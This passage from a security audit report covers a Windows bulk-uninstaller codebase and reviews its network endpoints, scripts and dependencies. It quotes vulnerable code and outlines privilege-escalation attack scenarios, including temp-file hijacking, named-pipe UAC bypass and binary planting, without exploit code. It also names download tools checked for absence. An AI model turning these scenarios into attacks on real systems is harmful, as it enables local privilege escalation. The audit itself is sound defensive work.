| **CWE** | CWE-377 (Insecure Temporary File), CWE-367 (TOCTOU Race Condition) |
| **File** | `source/UninstallTools/Uninstaller/UninstallManager.cs:175-195` |

**Code**

```csharp
var newName = PathTools.SanitizeFileName(entryName);
if (newName.Length > 8) newName = newName.Substring(0, 8);
newName += "_" + Path.GetFileName(startInfo.FileName);
...
var tempPath = Path.Combine(Path.GetTempPath(), newName);
File.Copy(startInfo.FileName, tempPath, true);
startInfo.FileName = tempPath;
```

The destination filename is fully predictable (first 8 characters of the display name + `_` + original filename), `File.Copy` overwrites unconditionally, and the copy is then launched — elevated.

**Attack scenario**

`Path.GetTempPath()` returns the *calling process's* `%TEMP%`. Where BCU is launched under a SYSTEM context (deployment tooling, RMM agent, scheduled task), that resolves to `C:\Windows\Temp`, which is writable by all authenticated users. A local attacker pre-creates `C:\Windows\Temp\MyApp_uninst000.exe` as a hardlink to a file they want overwritten (arbitrary-write primitive via `File.Copy` overwrite), or wins the window between `File.Copy` and `Process.Start` to swap in their own binary, which then runs elevated.

**Impact**

Local privilege escalation or arbitrary elevated file overwrite in SYSTEM-context deployments. Reduced impact when BCU runs interactively under an administrator account, since `%TEMP%` is then per-user.

**Recommendation**

Create a fresh randomly-named subdirectory (`Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), Path.GetRandomFileName()))`) with an explicit DACL granting access only to Administrators and SYSTEM, copy into it with `FileMode.CreateNew`, execute, then delete the directory. Never reuse a predictable name.

---

### BCU-M03 — Automation daemon named pipe accepts arbitrary process IDs from any same-user process

| | |
|---|---|
| **ID** | BCU-M03 |
| **Severity** | Medium |
| **CWE** | CWE-284 (Improper Access Control), CWE-940 (Improper Verification of Source of a Communication Channel) |
| **File** | `source/UninstallerAutomatizer/Automation/UninstallHandler.cs:120-190`, `:204-207` |

**Code**

```csharp
using (var server = new NamedPipeServerStream("UninstallAutomatizerDaemon", PipeDirection.In))
...
    if (!int.TryParse(line, out pid)) { …; continue; }
    var target = Process.GetProcessById(pid);
    if (!ProcessCanBeAutomatized(target)) { …; continue; }
    var app = Application.Attach(target);
    … AutomatedUninstallManager.AutomatizeApplication(app, …)
```

```csharp
private static bool ProcessCanBeAutomatized(Process target)
{
    return target.Id > 4 && !string.Equals(target.ProcessName, Program.AutomatizerProcessName, StringComparison.Ordinal);
}
```

The pipe is created with no `PipeSecurity` and without `PipeOptions.CurrentUserOnly`, so it inherits the process token's default DACL — reachable by any process running as the same user, including medium-integrity ones. The only validation on the supplied PID is "greater than 4" and "not myself"; there is no check that the process was actually spawned by the current uninstall task, that it is an uninstaller, or that BCU is its parent.

**Attack scenario**

While a bulk quiet uninstall is running (the daemon's lifetime), a medium-integrity process belonging to the same user connects to `\\.\pipe\UninstallAutomatizerDaemon` and writes the PID of an unrelated **elevated** window — a UAC consent prompt, a security-product configuration dialog, a credential dialog. The elevated automatizer attaches via UI Automation and clicks through it, defeating the integrity-level boundary that would normally prevent a medium-integrity process from driving a high-integrity window.

**Impact**

UAC-bypass primitive and unattended approval of elevated dialogs. Constrained by the daemon only running during quiet bulk uninstalls, and by `UseQuietUninstallDaemon` being a user setting.

**Recommendation**

- Construct the server as `new NamedPipeServerStream(name, PipeDirection.In, 1, PipeTransmissionMode.Byte, PipeOptions.CurrentUserOnly)` and additionally supply a `PipeSecurity` restricted to Administrators.
- Randomise the pipe name per run and pass it to the daemon on its command line so it is not a fixed, guessable endpoint.
- Maintain an allowlist of PIDs that the parent `BulkUninstallTask` actually spawned, and reject anything not on it; verify the parent-process relationship before attaching.

---

### BCU-M04 — "Certificate valid" indicator does not verify the Authenticode signature

| | |
|---|---|
| **ID** | BCU-M04 |
| **Severity** | Medium |
| **CWE** | CWE-347 (Improper Verification of Cryptographic Signature) |
| **Files** | `source/UninstallTools/ApplicationUninstallerEntry.cs:352-379`<br>`source/UninstallTools/Factory/InfoAdders/CertificateGetter.cs:45-59`<br>`source/BulkCrapUninstaller/Functions/ApplicationList/CertificateCache.cs:100-112` |

**Code**

```csharp
_certificate = CertificateGetter.TryGetCertificate(this);
if (_certificate != null)
    _certificateValid = _certificate.Verify();
```

```csharp
foreach (var candidate in fileNames.Take(2))
{
    try { return new X509Certificate2(candidate); } catch { }
}
```

`new X509Certificate2(path)` extracts the embedded signing certificate from a PE file. `X509Certificate2.Verify()` builds and validates the **certificate chain only** — it does **not** verify that the certificate actually signs the file's contents. That requires `WinVerifyTrust` (or `SignedCms` over the `WIN_CERTIFICATE` blob). A file whose signature has been invalidated by tampering, or an unsigned file carrying a copied certificate blob, is reported to the user as having a valid certificate.

BCU surfaces this as a trust signal — a certificate column and a "Certificate valid" property that users rely on to decide which entries are safe to keep. The result is cached in `CertCache.xml` alongside a `Valid` boolean (`CertificateCache.cs:100-112`) and read back without re-verification; for portable installs that file sits in a user-writable directory, so the cached verdict can be poisoned directly.

**Attack scenario**

Malware in `%LOCALAPPDATA%\Programs\Updater` embeds a copy of a legitimate publisher's certificate blob (with an invalid signature) in its executable. BCU shows it as certificate-valid and the administrator skips it during cleanup. The `Verify()` approach also produces false *negatives* on legitimate software with correctly countersigned but now-expired code-signing certificates.

**Impact**

Misleading trust indicator that can cause an administrator to retain malicious software or delete legitimate software.

**Recommendation**

Replace `X509Certificate2.Verify()` with a real Authenticode check — P/Invoke `WinVerifyTrust` with `WINTRUST_ACTION_GENERIC_VERIFY_V2` and `WTD_REVOKE_WHOLECHAIN` — and distinguish "signed and valid", "signed but invalid/tampered", and "unsigned" in the UI rather than collapsing them to a boolean. Sign or integrity-protect `CertCache.xml`, or store it under a path only administrators can write.

---

### BCU-M05 — Installer downloads and executes the .NET runtime with no integrity check, and can be pre-seeded

| | |
|---|---|
| **ID** | BCU-M05 |
| **Severity** | Medium |
| **CWE** | CWE-494 (Download of Code Without Integrity Check), CWE-427 (Uncontrolled Search Path Element) |
| **File** | `installer/CodeDependencies.iss:22-40`, `:69`, `:104-107`, `:504-513` |

**Code**

```pascal
procedure Dependency_AddDotNet80Desktop;
begin
  if not Dependency_IsNetCoreInstalled('Microsoft.WindowsDesktop.App', 8, 0, 13) then begin
    Dependency_Add('dotnet80desktop' + Dependency_ArchSuffix + '.exe',
      '/lcid ' + IntToStr(GetUILanguage) + ' /passive /norestart',
      '.NET Desktop Runtime 8.0.13' + Dependency_ArchTitle,
      Dependency_String('https://download.visualstudio.microsoft.com/...x86.exe',
                        'https://download.visualstudio.microsoft.com/...x64.exe'),
      '', False, False);          ← the '' is the Checksum parameter
  end;
end;
```

```pascal
  if FileExists(ExpandConstant('{tmp}{\}') + Filename) then begin
    Dependency.URL := '';           ← download skipped entirely if the file already exists
  end else begin
    Dependency.URL := URL;
  end;
```

```pascal
  Dependency_DownloadPage.Add(… .URL, … .Filename, … .Checksum);   ← empty checksum = no verification
  …
  if ShellExec('', ExpandConstant('{tmp}{\}') + … .Filename, … .Parameters, '', SW_SHOWNORMAL, ewWaitUntilTerminated, ResultCode) then begin
```

Every one of the ~40 `Dependency_Add` calls passes `''` as the checksum, so Inno Setup's `DownloadTemporaryFile` performs no hash verification. The downloaded executable is then run elevated (the installer is `PrivilegesRequired=admin`). Transport is HTTPS to `download.visualstudio.microsoft.com`, which is the only integrity control in play.

Separately, if a file with the expected name already exists in `{tmp}`, the download is skipped and the pre-existing file is executed.

**Attack scenario**

The pre-seeding path is the sharper one: Inno's `{tmp}` is a randomly named subdirectory of `%TEMP%`. When setup runs interactively as an administrator that is per-user and hard to target. When setup is run by deployment tooling as SYSTEM, `{tmp}` is created under `C:\Windows\Temp`, which is world-writable — a local attacker watching for directory creation can drop `dotnet80desktopx64.exe` into it and have it executed as SYSTEM.

**Impact**

Elevated execution of an unverified binary during installation.

**Recommendation**

Populate the `Checksum` argument with the published SHA-256 for each dependency (Inno Setup verifies it when non-empty). Remove the "skip download if the file already exists" shortcut, or restrict it to files the installer itself placed in this session. Prefer the non-`Light` build variant, which bundles a self-contained runtime and downloads nothing.

---

### BCU-M06 — Unqualified `cmd.exe`, `regedit.exe`, and `CleanLogs.bat` launched from an elevated process

| | |
|---|---|
| **ID** | BCU-M06 |
| **Severity** | Medium |
| **CWE** | CWE-426 (Untrusted Search Path) |
| **Files** | `source/BulkCrapUninstaller/Program.cs:229-242`<br>`source/KlocTools/Tools/RegistryTools.cs:396`, `:454` |

**Code**

```csharp
var ps = new ProcessStartInfo
{
    WorkingDirectory = AssemblyLocation.FullName,
    FileName = "cmd.exe",
    Arguments = "/c start /min " + cleanerName,   // cleanerName = "CleanLogs.bat", unqualified
    UseShellExecute = true,
    WindowStyle = ProcessWindowStyle.Minimized
};
Process.Start(ps);
```

```csharp
var startInfo = new ProcessStartInfo("regedit.exe", command) { UseShellExecute = false };
…
Process.Start("regedit.exe");
```

None of these are absolute paths. `EntryPoint.Main:41` sets the process working directory to the application directory, and `ShellExecute` search order includes the current directory.

**Attack scenario**

For a **portable** deployment — extracted to `%USERPROFILE%\Downloads\BCUninstaller\`, a USB stick, or a network share — that directory is writable by a standard user. A planted `cmd.exe`, `regedit.exe`, or `CleanLogs.bat` in that folder is executed with the Administrator token when the user runs BCU and it cleans up logs on exit (`EntryPoint.cs:87-88`, which fires automatically for every non-installed, non-debug run) or opens a key in regedit.

Installed deployments under `%ProgramFiles%` are not affected, since that directory is not writable by standard users.

**Impact**

Local privilege escalation for the portable distribution, which is a first-class supported variant of this product.

**Recommendation**

Use absolute paths built from `Environment.GetFolderPath(Environment.SpecialFolder.System)` for `cmd.exe` and `regedit.exe` (the codebase already does this correctly for `Dism.exe` at `DismTools.cs:19`). Pass `CleanLogs.bat` as a fully-qualified path — the code already computes `cleanerPath` at `Program.cs:217` and then discards it in favour of the bare filename. Better still, replace the batch file with in-process file deletion and remove `cmd.exe` from the picture entirely.

---

### BCU-M07 — No dependency lock files; two floating version ranges

| | |
|---|---|
| **ID** | BCU-M07 |
| **Severity** | Medium |
| **CWE** | CWE-1104 (Use of Unmaintained Third Party Components), CWE-494 (Download of Code Without Integrity Check) |
| **Files** | `source/KlocTools/KlocTools.csproj:14`, `source/UninstallTools/UninstallTools.csproj:19`, `source/UninstallerAutomatizer/UninstallerAutomatizer.csproj:20` |

**Code**

```xml
<PackageReference Include="System.Management" Version="[8.*,9)" />
<PackageReference Include="System.Drawing.Common" Version="[8.*,9)" />
```

No `packages.lock.json`, `packages.config`, or `nuget.config` exists anywhere in the repository. `RestorePackagesWithLockFile` is not set in `Directory.Build.props`. Restore therefore resolves against whatever feeds the build machine has configured, and the two floating ranges above silently pick up new package versions between builds.

**Attack scenario**

Builds are not reproducible and cannot be attested. A compromised or newly-published package version matching `[8.*,9)` is pulled into a build without any commit to this repository recording the change. With no `nuget.config` restricting sources, a machine with an additional feed configured can also resolve a package from an unintended source.

**Impact**

Non-reproducible builds; unreviewed dependency drift; weakened ability to respond to a compromised upstream package.

**Recommendation**

Set `<RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>` in `Directory.Build.props`, commit the generated `packages.lock.json` files, and build with `--locked-mode` in CI. Pin the two floating ranges to exact versions. Add a `nuget.config` that names `nuget.org` as the only source and enables package source mapping.

---

## 7. Low Findings

### BCU-L01 — Windows-directory guard uses a case-sensitive comparison

**CWE-178** · `source/UninstallTools/Junk/Finders/JunkCreatorBase.cs:56`

```csharp
if (dirInfo.FullName.Contains(FullWindowsDirectoryName) || !dirInfo.Exists || dirInfo.Parent == null)
    return null;
```

`string.Contains(string)` is ordinal and **case-sensitive**. `FullWindowsDirectoryName` is typically `C:\WINDOWS` or `C:\Windows`; a registry-supplied path of `c:\windows\…` does not match and the safety check is bypassed, allowing a Windows subdirectory to be proposed as junk. The sibling function `UninstallToolsGlobalConfig.IsSystemDirectory` gets this right with `StringComparison.OrdinalIgnoreCase`. **Fix:** use `Contains(FullWindowsDirectoryName, StringComparison.OrdinalIgnoreCase)`, or better, call the existing `IsSystemDirectory` helper.

### BCU-L02 — Path containment checked by string prefix rather than path boundary

**CWE-706** · `source/UninstallTools/Junk/Finders/JunkCreatorBase.cs:43`, `source/UninstallTools/UninstallToolsGlobalConfig.cs:249-256`

```csharp
return !string.IsNullOrEmpty(location) && otherInstallLocations.Any(x =>
    x.TrimEnd('\\').StartsWith(location, StringComparison.InvariantCultureIgnoreCase));
```

A bare `StartsWith` treats `C:\Program Files\App` as a prefix of `C:\Program Files\AppData`, producing both false positives and false negatives in the "is this directory still used?" safety check. The codebase already contains a correct boundary-aware helper, `PathTools.SubPathIsInsideBasePath` (`PathTools.cs:353`), which is not used here. **Fix:** route all containment checks through `SubPathIsInsideBasePath`.

### BCU-L03 — User-supplied regular expressions run without a timeout

**CWE-1333** · `source/UninstallTools/Lists/FilterCondition.cs:114`

```csharp
result = Regex.IsMatch(target, FilterText, RegexOptions.CultureInvariant);
```

`FilterText` comes from `.bcul` uninstall lists, which are shared and downloaded between users, and is evaluated against every discovered application. A catastrophically backtracking pattern hangs the application indefinitely. **Fix:** pass a `matchTimeout` (e.g. 1 second) and catch `RegexMatchTimeoutException`; consider `RegexOptions.NonBacktracking`.

### BCU-L04 — Unbounded wait loop in the deleter

**CWE-835** · `source/UniversalUninstaller/Program.cs:128-131`

```csharp
private static void WaitForDirEmpty(DirectoryInfo baseDir)
{
    do Thread.Sleep(100); while (baseDir.GetFileSystemInfos().Any());
}
```

If any file cannot be deleted (locked, ACL-denied) or is recreated by a running process, this spins forever with no timeout and no cancellation — an elevated process hanging indefinitely. **Fix:** add a bounded retry count and throw after it elapses.

### BCU-L05 — Stable machine fingerprint derived from SID and MAC addresses via MD5

**CWE-327 / privacy** · `source/BulkCrapUninstaller/Program.cs:150-168`, `source/BulkCrapUninstaller/Functions/Ratings/UninstallerRatingManager.Utils.cs:45-63`

```csharp
var idStr = windowsIdentity.User?.Value
          + string.Join("", windowsIdentity.Claims.Select(x => x.Value))
          + networkIdentity;                        // concatenated MAC addresses of every NIC
return UninstallerRatingManager.Utils.StableHash(idStr);
```

`StableHash` is MD5 folded to 64 bits. The result is a stable, per-machine, per-user identifier transmitted as `userId` with every crash report, statistics upload, and rating operation. `PrivacyPolicy.txt` describes it as "not guaranteed to be unique", but it is deterministically derived from the user's SID, group claims, and hardware addresses — that is a device fingerprint, not an anonymous token. MD5 is also inappropriate here on principle, though no signature or authentication depends on it. **Fix:** generate a random GUID once and store it; if a hash is retained, use SHA-256. Update the privacy policy to describe the derivation honestly.

### BCU-L06 — CI workflow actions pinned to mutable tags; no explicit permissions

**CWE-1357** · `.github/workflows/ci.yaml`

`actions/checkout@v4`, `microsoft/setup-msbuild@v2`, and `actions/upload-artifact@v4` are pinned to major-version tags, which maintainers can repoint. The workflow declares no `permissions:` block, so it inherits the repository default token scope. It also triggers on `pull_request`, meaning MSBuild builds untrusted PR code on the runner — MSBuild targets are arbitrary code execution by design. Fork PRs get a read-only token by default, which limits this considerably. **Fix:** pin to commit SHAs, add `permissions: contents: read` at the workflow level, and consider `pull_request_target` restrictions or a manual-approval gate for first-time contributors.

### BCU-L07 — Unsigned prebuilt binaries committed to the repository

**CWE-506 (as a hygiene concern)** · `source/NBug_custom/NBug.Configurator/`

| File | SHA-256 | Signature |
|---|---|---|
| `NBug.Configurator.exe` | `0976C1B8…95465` | **Not signed** |
| `NBug.Examples.WinForms.exe` | `39E773ED…1F6901` | **Not signed** |
| `NBug.dll` | `7AA983A5…A2A9A3` | **Not signed** |

These are developer tools from the abandoned NBug 1.2 project (last upstream release ~2013) and are **not** referenced by any `.csproj` and **not** copied to the build output, so they do not ship. They remain unverifiable binary blobs in the source tree. By contrast, the binaries that *do* ship are properly signed:

| File | SHA-256 | Signature |
|---|---|---|
| `source/es.exe` | `9A9B851F…9B9383` | **Valid** — `CN=voidtools PTY LTD, O=voidtools PTY LTD, C=AU` (v1.1.0.30) |
| `…/MicrosoftProgram_Install_and_Uninstall.meta.diagcab` | `B7712D30…812E0C` | **Valid** — `CN=Microsoft Corporation, OU=MOPR` |

**Fix:** delete the three NBug binaries from the fork.

### BCU-L08 — Unattended CLI performs elevated deletion with no confirmation

**CWE-250** · `source/BCU-console/Program.cs:29-56`

`BCU-console uninstall list.bcul /U /J=Unknown` runs uninstallers and junk deletion elevated with no user interaction, at the *lowest* confidence threshold. The help text carries prominent warnings, and this is deliberate operational functionality, but combined with BCU-C01 it removes the "administrator notices the odd path" mitigation entirely. **Fix:** refuse confidence levels below `VeryGood` when `/U` is specified unless an additional explicit flag is passed; log every deleted path.

---

## 8. External Communications

Every network destination reachable from application code. Nothing was contacted during this review.

### 8.1 Application runtime

| Endpoint | File:Line | Purpose | Triggered when | Data transmitted | Risk | Assessment |
|---|---|---|---|---|---|---|
| `http://bugsklocman.ddns.net:7721/SendCrashReport` | `NBugConfigurator.cs:69` | Crash reporting | Unhandled exception, after the NBug dialog. **Not gated by any privacy setting** | `userId` (machine fingerprint) + Brotli/Base64 XML: exception type, message, full stack trace, target site, app + CLR version, OS version string, 64-bit flag, UI locale. Stack traces routinely contain the Windows username in file paths | **Medium** | Expected for upstream; **must be removed** for a fork |
| `http://bugsklocman.ddns.net:7721/SendStats` | `DatabaseStatSender.cs:27` | Usage telemetry | On exit, only if `MiscSendStatistics` (default **False**) | `userId` + Brotli/Base64 XML: UI event hit counts, app version, OS version, 64-bit, locale, installed .NET versions, launch count | **Medium** | Expected; opt-in respected |
| `http://bugsklocman.ddns.net:7721/GetAverageRatingsComp` | `UninstallerRatingManager.cs:37` | Fetch community ratings | List refresh, if `MiscUserRatings` (default **False**), max once per cache window | None outbound; **inbound** Base64→Brotli→JSON decoded in an elevated process | **Medium** | Expected; inbound path is the risk |
| `http://bugsklocman.ddns.net:7721/GetUserRatings?userId=…` | `UninstallerRatingManager.cs:41` | Fetch this user's ratings | Same | `userId` in query string | **Medium** | Expected |
| `http://bugsklocman.ddns.net:7721/SetUserRating?userId=…&appId=…&rating=…` | `UninstallerRatingManager.cs:67` | Submit a rating | On exit, if ratings enabled and ratings are pending | `userId`, MD5-derived `appId`, rating value | **Medium** | Expected |
| `http://localhost:7721` | `Program.cs:61` | Debug variant of the above | Only when a debugger is attached | — | Low | Expected |
| `https://github.com/Klocman/Bulk-Crap-Uninstaller/releases/latest` | `UpdateGrabber.cs:115,171-179` | Update check | Manual, or at startup if `MiscCheckForUpdates` (default **False**) | HTTP `HEAD`; version parsed from the redirect target | **Low** | Expected. No auto-download or auto-install — the user is sent to the browser |
| `http://klocmansoftware.weebly.com/feedback--contact.html` | `FeedbackWindow.cs:51` | Feedback form in an embedded `WebBrowser` control | User opens Feedback | Whatever the user types into the page | **Low** | Expected; plaintext HTTP, and the legacy IE-based `WebBrowser` control |
| `https://www.google.com/search?q=…` | `OnlineSearchTools.cs:20` | "Look up online" | Explicit menu action, behind a confirmation dialog | Application display name, URL-encoded | **Low** | Expected |
| `http://filehippo.com/search?q=…` | `OnlineSearchTools.cs:24` | Same | Same | Trimmed application name | **Low** | Expected; plaintext HTTP |
| `https://sourceforge.net/directory/?q=…` | `OnlineSearchTools.cs:28` | Same | Same | Trimmed application name | **Low** | Expected |
| `https://www.fosshub.com/search/…` | `OnlineSearchTools.cs:33` | Same | Same | Trimmed application name | **Low** | Expected |
| `https://alternativeto.net/browse/search/?q=…` | `OnlineSearchTools.cs:38` | Same | Same | Trimmed application name | **Low** | Expected |
| `https://github.com/search?q=…` | `OnlineSearchTools.cs:43` | Same | Same | Trimmed application name | **Low** | Expected |
| `https://www.slant.co/search?query=…` | `OnlineSearchTools.cs:48` | Same | Same | Trimmed application name | **Low** | Expected |
| `https://www.voidtools.com/` | `AboutBox.cs:198` | Credit link | User clicks | None | **None** | Expected |

### 8.2 Installer only

| Endpoint | File | Purpose | Risk |
|---|---|---|---|
| `https://download.visualstudio.microsoft.com/download/pr/…/windowsdesktop-runtime-8.0.13-win-{x86,x64}.exe` | `CodeDependencies.iss:511` | .NET 8 Desktop Runtime, the only dependency actually enabled (via `Dependency_AddDotNet80Desktop`, `BcuSetup.iss` `InitializeSetup`) | **Medium** — no checksum (BCU-M05) |
| ~35 further Microsoft URLs (`aka.ms`, `go.microsoft.com`, `download.microsoft.com`, `builds.dotnet.microsoft.com`) for .NET 3.5–9.0, VC++ 2005–2022, DirectX, SQL Express, WebView2, Access Database Engine | `CodeDependencies.iss` | Unreferenced library code from `DomGries/InnoDependencyInstaller` | **Low** — dead code, never invoked, but present |

### 8.3 Dynamically generated URLs

- `OnlineSearchTools.SearchOnline` (`:62-97`) concatenates a fixed base URL with `HttpUtility.UrlEncode`-escaped application names. Encoding is applied correctly; the destination host is always a compile-time constant. Launched via `Process.Start(… UseShellExecute = true)`, so the default browser handles it.
- `UninstallerRatingManager` and `NBugConfigurator` build relative URIs against the fixed `Program.ConnectionString` base. The host is not dynamic; only query parameters vary.
- No URL is ever read from a configuration file, registry value, or server response. There is **no** mechanism by which a remote party can redirect the application to a new endpoint.

### 8.4 Not present

No DNS resolution beyond ordinary HTTP client use, no raw sockets, no `TcpClient`, no WebSockets, no FTP, no SMTP (the `NBug_custom` `Ftp.cs` / `Mail.cs` / `Redmine.cs` / `BugNet.cs` protocol handlers are dead code — the only registered destination is `NBugDatabaseSenderWrapper`), no `curl`/`wget`/`Invoke-WebRequest`/`Invoke-RestMethod`/`certutil`/`bitsadmin` anywhere in the repository.

---

## 9. Scripts

Full inventory. Every script in the repository was read.

### `publish.bat` (repo root, 145 lines) — **build-time only, not shipped**

Release build driver. Locates MSBuild (hardcoded `D:\Applications\VS2022\…`, falling back to `vswhere -latest` then `where msbuild`); deletes `bin\publish` and `bin\launcher` with `rmdir /q /s`; builds the native launcher via the solution; iterates `*.csproj` under `source\`, selecting those containing `exe</OutputType>` via `findstr`, and publishes each with MSBuild for `win-x64` (self-contained) and `Any CPU` (framework-dependent); copies docs; deletes `*.pdb` in Release.

*Capabilities:* deletes files (only under `bin\` relative to the repo), runs executables (MSBuild). Does **not** download code, touch the registry, modify security settings, establish persistence, or execute encoded commands. **Assessment: expected, benign.** Minor note: the hardcoded absolute MSBuild path is a portability wart, not a security issue.

### `source/BulkCrapUninstaller/CleanLogs.bat` (49 lines) — **shipped with the portable build only**

Invoked by `Program.StartLogCleaner()` (`Program.cs:212-250`) at shutdown when BCU is running non-installed and not in debug mode. Waits in a `tasklist | find` polling loop (using `ping -n 2 127.0.0.1` as a sleep) until `BCUninstaller.exe` exits, then `cd /d "%LOCALAPPDATA%\Microsoft"` and runs `del /f /s` for five specific `.log` filenames, then `rd /s /q` on `%LOCALAPPDATA%\Marcin_Szeniak\BCUninstaller*`, then removes the parent directory if it is empty.

*Capabilities:* **deletes files recursively.** Scope is constrained to five hardcoded filenames under `%LOCALAPPDATA%\Microsoft`, and to directories matching a fixed prefix. Does not download code, run executables, modify the registry, or establish persistence. **Assessment: expected, benign in itself** — but see **BCU-M06**: it is *launched* by an unqualified `cmd.exe` with the working directory set to the (potentially user-writable) application folder.

The Inno Setup script contains a commented-out `DeinitializeUninstall` procedure (`BcuSetup.iss`, marked `TODO: Test, fix issues and enable`) that would replicate this logic at uninstall time via `Exec({cmd}, '/C for /d %G in (…) do rd /s /q "%G"')`. It is inert. Should it be enabled, the `for /d` pattern over `SettingsDir + '\\BCUninstaller*'` would warrant its own review.

### `installer/BcuSetup.iss` (318 lines) — Inno Setup, build-time

`PrivilegesRequired=admin`, `DefaultDirName={commonpf}\BCUninstaller`, `AppId={f4fef76c-1aa9-441c-af7e-d27f58d898d1}`. Copies build output plus per-language resource folders. `[InstallDelete]` removes stale `win-x64`/`win-x86` directories under `{app}`. `[UninstallDelete]` removes BCU-generated files (settings, logs, caches, `Exception_*.zip`) under `{app}` and `{app}\*`. `[Run]` launches the app post-install with `nowait postinstall skipifsilent shellexec`. The `[Code]` section calls `Dependency_AddDotNet80Desktop` from `InitializeSetup`.

*Capabilities:* deletes files (scoped to `{app}`), runs an executable (the freshly installed app), writes the standard Windows uninstall registry key. No persistence beyond an optional desktop/start-menu icon. **Assessment: expected, benign.**

### `installer/CodeDependencies.iss` (781 lines) — Inno Setup library, build-time

Third-party dependency installer from `DomGries/InnoDependencyInstaller`. Defines ~40 `Dependency_Add*` procedures. **Downloads code and executes it elevated** — see **BCU-M05**. Only `Dependency_AddDotNet80Desktop` is actually reachable from `BcuSetup.iss`; the rest is unreferenced.

### `installer/PortablePage.iss` (170 lines) — Inno Setup, build-time

Adds a wizard page offering a "portable" install mode. Only compiled in the non-`Light` variant, which is **not** the configured build (`BcuSetup.iss:5` defines `Light`). Inert in the current configuration. No downloads, no execution, no registry writes.

### `.github/workflows/ci.yaml` — see §11 / BCU-L06

### `.github/workflows/winget.yml` — see BCU-H05

### Not present

**No** `.ps1`, `.sh`, `.py`, `.js`, `.vbs`, `.wsf`, or `.cmd` files exist anywhere in the repository. The only shell-adjacent artefacts are the two `.bat` files and the three `.iss` files above.

`source/ScriptHelper/` is a C# project despite its name — it applies registry "tweak reversals" (`Tweaks.cs`, ~10 hardcoded entries writing to `HKCU\Control Panel\*`, `HKCU\…\ContentDeliveryManager`, and deleting `HKLM\…\MyComputer\NameSpace\{…}` shell-namespace keys). All targets are fixed, compile-time constants; nothing is user-supplied. A commented-out OneDrive-removal block contains PowerShell source **as comments only** — it is never written to disk or executed.

---

## 10. Dependencies

### 10.1 Manifests and lock files

- **Manifests:** 18 `.csproj`, 1 `.vcxproj`, 1 `.shproj`, `source/Directory.Build.props`, `source/BulkCrapUninstaller.sln`
- **Lock files:** **none.** No `packages.lock.json`, no `packages.config`, no `nuget.config`, no `.nuspec`. See **BCU-M07**.

### 10.2 NuGet packages

| Package | Version | Used by | Assessment |
|---|---|---|---|
| `Microsoft.VisualBasic` | `10.3.0` | `BulkCrapUninstaller`, `UninstallTools` | Microsoft-published. Used for `FileSystem.DeleteDirectory` with `RecycleOption.SendToRecycleBin` — a good choice, it makes junk removal reversible |
| `System.Management` | **`[8.*,9)`** | `KlocTools`, `UninstallTools` | Microsoft-published. **Floating range** |
| `System.Drawing.Common` | **`[8.*,9)`** | `UninstallerAutomatizer` | Microsoft-published. **Floating range** |
| `System.ServiceProcess.ServiceController` | `[8.*,9)` | `OculusHelper` | Microsoft-published. Floating range |
| `Newtonsoft.Json` | `13.0.4` | `OculusHelper` | Widely used, actively maintained, current. `TypeNameHandling` is **not** used anywhere — no insecure-deserialisation exposure |
| `TaskScheduler` | `2.12.2` | `UninstallTools` | `dahall/TaskScheduler`, well-established, current |
| `FlaUI.UIA3` | `5.0.0` | `UninstallerAutomatizer` | Actively maintained UI-automation library |
| `FlaUI.Adapter.White` | **`0.2.1`** | `UninstallerAutomatizer` | **Low-adoption compatibility shim** for the long-abandoned TestStack.White. Small package, few maintainers. Worth reviewing whether it can be dropped in favour of FlaUI's native API |
| `Microsoft.NET.Test.Sdk` | `18.3.0` | tests | Test-only |
| `MSTest.TestAdapter` / `MSTest.TestFramework` | `4.1.0` | tests | Test-only |

**Typosquatting:** every package name was checked against its canonical spelling. No typosquats, no lookalike names, no packages from unexpected authors.

**Git-based / URL-based dependencies:** none. No `<PackageReference>` with a source URL, no git submodules (`.gitmodules` absent), no `<Import>` of a remote target.

**Install hooks:** NuGet `PackageReference` (the format used throughout) does not support `install.ps1` / `uninstall.ps1` lifecycle scripts — those only run under the legacy `packages.config` format, which is not used here. There are no `package.json` files, therefore no `preinstall` / `postinstall` / `prepare` scripts. There are no MSBuild `Exec` tasks or custom `Target`s with `BeforeTargets`/`AfterTargets` in any project file.

### 10.3 Vendored (source-copied) dependencies

| Component | Version | LOC | Assessment |
|---|---|---|---|
| `ObjectListView` | 2.10.0 (file version 2.9.1) | 45,489 | Upstream (`objectlistview.sourceforge.net`) is dormant. Vendoring is the norm for this library. Reviewed for network and process activity — the only `Process.Start` is a hyperlink click handler. No concerns |
| `NBug_custom` | 1.2.0, modified | 9,642 | Upstream NBug is **abandoned** (last release ~2013). Contains dead `Ftp`, `Mail`, `Redmine`, `BugNet` submission backends with sample endpoints (`tracker.mydomain.com`, `futureware.biz`) that are never registered. Only `NBugDatabaseSenderWrapper` is wired up. Includes a bundled `ZipStorer` implementation |
| `PortableSettingsProvider` | — | 328 | Small; `XmlDocument`-based settings persistence. Under .NET 8, `XmlDocument.XmlResolver` defaults to `null`, so no XXE exposure |
| `SimpleTreeMap`, `NetSettingBinder` | — | 1,167 | Author's own utility libraries |
| `es.exe` | 1.1.0.30 | binary | voidtools "Everything" CLI, **validly signed**. Optional accelerator for folder-size calculation; the code degrades gracefully to `Scripting.FileSystemObject` when absent (`FastSizeGenerator.cs:34-44`) |

### 10.4 COM references

| Interop | GUID / library | Used by | Note |
|---|---|---|---|
| `Scripting` (Windows Script Host Runtime, `scrrun.dll`) | `{420B2830-E718-11CF-893D-00A0C9054228}` | `UninstallTools`, `UniversalUninstaller` | Used **only** for `FileSystemObject.GetFolder(...).Size`. No `Eval`, no `Run`, no script execution. Benign despite the alarming name |
| `WUApiLib` | — | `WinUpdateHelper` | Windows Update Agent API, for enumerating and removing updates |

### 10.5 Known-vulnerability posture

No dependency in this graph carries a currently-published CVE at the pinned version. The realistic dependency risk here is **maintenance** (NBug and ObjectListView are unmaintained; `FlaUI.Adapter.White` is low-adoption) rather than known exploitable defects.

---

## 11. Persistence Mechanisms

**BCU installs no persistence for itself.** There is no code anywhere in the repository that writes a `Run` or `RunOnce` value, creates a service, registers a scheduled task, drops a Startup-folder shortcut, creates a WMI event subscription, or registers a shell extension **for BCU**.

What the application does establish, all of it standard and user-visible:

| Mechanism | File | Nature |
|---|---|---|
| Uninstall registry key `…\Uninstall\{f4fef76c-…}` | `installer/BcuSetup.iss` `[Setup] AppId` | Standard Add/Remove Programs entry, created by Inno Setup |
